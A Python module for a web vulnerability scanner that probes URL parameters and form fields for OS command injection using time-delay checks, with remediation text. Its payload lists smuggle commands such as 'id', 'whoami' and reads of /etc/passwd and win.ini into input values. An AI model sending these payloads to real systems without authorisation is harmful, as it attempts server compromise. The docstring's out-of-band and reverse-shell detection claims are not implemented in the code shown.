"""
Command Injection (OS Command Injection) Scanner
OWASP A3:2021 — Injection
CWE-78: Improper Neutralization of Special Elements used in an OS Command

Tests for:
  - Classic command injection (; | && ||)
  - Blind command injection (time-based via sleep/ping)
  - Out-of-band command injection (OOB DNS/HTTP)
  - Reverse shell detection hints
  - Shell metacharacter injection
"""

import time
import re
from .base import BaseScanner, Finding

# ── Payloads ──────────────────────────────────────────────────────────────────

# Command injection payloads — semicolons, pipes, backticks, subshells
CMDI_PAYLOADS = [
    # Linux/macOS command chaining
    ("; id", ["uid=", "gid=", "groups="]),
    ("| id", ["uid=", "gid=", "groups="]),
    ("& id", ["uid=", "gid=", "groups="]),
    ("&& id", ["uid=", "gid=", "groups="]),
    ("|| id", ["uid=", "gid=", "groups="]),
    ("`id`", ["uid=", "gid=", "groups="]),
    ("$(id)", ["uid=", "gid=", "groups="]),
    # Linux file read
    ("; cat /etc/passwd", ["root:x:", "/bin/bash", "daemon:"]),
    ("| cat /etc/passwd", ["root:x:", "/bin/bash", "daemon:"]),
    # Windows
    ("& whoami", ["nt authority", "system", "administrator"]),
    ("| whoami", ["nt authority", "system", "administrator"]),
    ("& type c:\\windows\\win.ini", ["[fonts]", "[extensions]"]),
    # newline injection
    ("\n id\n", ["uid=", "gid=", "groups="]),
    ("%0a id", ["uid=", "gid=", "groups="]),
    # URL-encoded
    ("%3B id", ["uid=", "gid=", "groups="]),
    ("%7C id", ["uid=", "gid=", "groups="]),
]

# Time-based blind payloads (sleep)
TIME_BASED_PAYLOADS = [
    ("; sleep 5", 5),
    ("| sleep 5", 5),
    ("&& sleep 5", 5),
    ("$(sleep 5)", 5),
    ("`sleep 5`", 5),
    ("; ping -c 5 127.0.0.1", 5),  # alternative to sleep
    ("& timeout /T 5", 5),         # Windows
    ("%3Bsleep%205", 5),
    ("%7Csleep+5", 5),
]

# Common parameters susceptible to command injection
CMDI_PARAMS = [
    "cmd", "exec", "command", "ping", "host", "ip", "domain",
    "filename", "file", "dir", "path", "input", "url", "query",
    "search", "keyword", "term", "q", "data", "text", "name",
    "action", "process", "run", "system", "shell",
]


class CMDiScanner(BaseScanner):
    """Scans for OS Command Injection vulnerabilities."""

    SCANNER_NAME = "Command Injection"
    OWASP_CATEGORY = "A03:2021"
    CWE = "CWE-78"

    def run(self) -> list[Finding]:
        self.logger.info(f"Starting Command Injection scan against {self.target}")

        # Test URL query params
        params = self.get_query_params(self.target)
        for param in params:
            self._test_error_based_cmdi(self.target, param)
            self._test_time_based_cmdi(self.target, param)

        # Test common endpoints
        for endpoint in self._get_test_endpoints():
            ep_params = self.get_query_params(endpoint)
            for param in ep_params:
                self._test_error_based_cmdi(endpoint, param)

        # Test form inputs
        forms = self.get_forms(self.target)
        for form in forms:
            self._test_form_cmdi(form)

        return self.findings

    def _get_test_endpoints(self) -> list[str]:
        return [
            f"{self.target}/ping?host=127.0.0.1",
            f"{self.target}/exec?cmd=ls",
            f"{self.target}/api/ping?ip=127.0.0.1",
            f"{self.target}/lookup?host=example.com",
            f"{self.target}/dig?domain=example.com",
            f"{self.target}/traceroute?host=example.com",
            f"{self.target}/nslookup?host=example.com",
            f"{self.target}/whois?domain=example.com",
            f"{self.target}/scan?target=127.0.0.1",
        ]

    def _test_error_based_cmdi(self, url: str, param: str):
        """Test for direct command output in response."""
        for payload, indicators in CMDI_PAYLOADS:
            # Append to a realistic value
            test_value = f"127.0.0.1{payload}"
            test_url = self.inject_param(url, param, test_value)
            resp, evidence = self.http.get(test_url)
            if resp is None:
                continue

            if self.contains_any(resp.text, indicators):
                self.add_finding(Finding(
                    title="OS Command Injection — Command Output in Response",
                    severity="CRITICAL",
                    owasp="A03:2021",
                    cwe="CWE-78",
                    cvss_score=10.0,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                    url=url,
                    parameter=param,
                    payload=test_value,
                    description=(
                        f"Parameter `{param}` is passed directly to a system command. "
                        f"Injecting `{payload}` caused command output to appear in the response, "
                        "confirming OS command injection."
                    ),
                    impact=(
                        "Full server compromise: arbitrary command execution, "
                        "data exfiltration, privilege escalation, reverse shell, ransomware."
                    ),
                    remediation=(
                        "Never pass user input to system(), exec(), shell_exec(), popen(), or subprocess.run(shell=True). "
                        "Use subprocess.run() with a list of arguments (no shell=True). "
                        "Apply strict input allowlisting. "
                        "Run web application as a low-privilege user."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/Command_Injection",
                        "https://cwe.mitre.org/data/definitions/78.html",
                        "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
                    ],
                    evidence=evidence,
                    confirmed=True,
                    vuln_type="cmdi",
                ))
                return

    def _test_time_based_cmdi(self, url: str, param: str):
        """Test for blind command injection via time delays."""
        for payload_tuple in TIME_BASED_PAYLOADS:
            if isinstance(payload_tuple, tuple):
                payload, delay = payload_tuple
            else:
                continue
            test_value = f"test{payload}"
            test_url = self.inject_param(url, param, test_value)
            t0 = time.time()
            resp, evidence = self.http.get(test_url)
            elapsed = time.time() - t0
            if resp is None:
                continue
            if elapsed >= delay * 0.85:
                self.add_finding(Finding(
                    title="Blind OS Command Injection — Time-Based",
                    severity="CRITICAL",
                    owasp="A03:2021",
                    cwe="CWE-78",
                    cvss_score=9.8,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                    url=url,
                    parameter=param,
                    payload=test_value,
                    description=(
                        f"Injecting `{payload}` into `{param}` caused a ~{elapsed:.1f}s delay, "
                        "indicating blind command injection. The server executed the injected command "
                        "but output is not reflected."
                    ),
                    impact="Remote code execution — escalate with reverse shell or OOB exfiltration.",
                    remediation=(
                        "Never pass user input to shell commands. "
                        "Use parameterised subprocess calls without shell=True."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/Command_Injection",
                        "https://portswigger.net/web-security/os-command-injection",
                    ],
                    evidence=evidence,
                    confirmed=True,
                    vuln_type="cmdi",
                ))
                return

    def _test_form_cmdi(self, form: dict):
        """Test form inputs for command injection."""
        action = form.get("action", self.target)
        method = form.get("method", "get")
        inputs = form.get("inputs", [])

        for inp in inputs:
            name = inp.get("name", "")
            if not name:
                continue
            for payload, indicators in CMDI_PAYLOADS[:5]:
                test_value = f"test{payload}"
                data = {i.get("name", ""): i.get("value", "test") for i in inputs if i.get("name")}
                data[name] = test_value

                if method == "post":
                    resp, evidence = self.http.post(action, data=data)
                else:
                    from urllib.parse import urlencode
                    resp, evidence = self.http.get(f"{action}?{urlencode(data)}")

                if resp is None:
                    continue
                if self.contains_any(resp.text, indicators):
                    self.add_finding(Finding(
                        title="OS Command Injection via Form Field",
                        severity="CRITICAL",
                        owasp="A03:2021",
                        cwe="CWE-78",
                        cvss_score=10.0,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                        url=action,
                        parameter=name,
                        payload=test_value,
                        description=f"Form field `{name}` at `{action}` is vulnerable to command injection.",
                        impact="Remote code execution on the server.",
                        remediation="Avoid shell commands in business logic. Use safe APIs instead.",
                        references=["https://owasp.org/www-community/attacks/Command_Injection"],
                        evidence=evidence,
                        confirmed=True,
                        vuln_type="cmdi",
                    ))
                    return
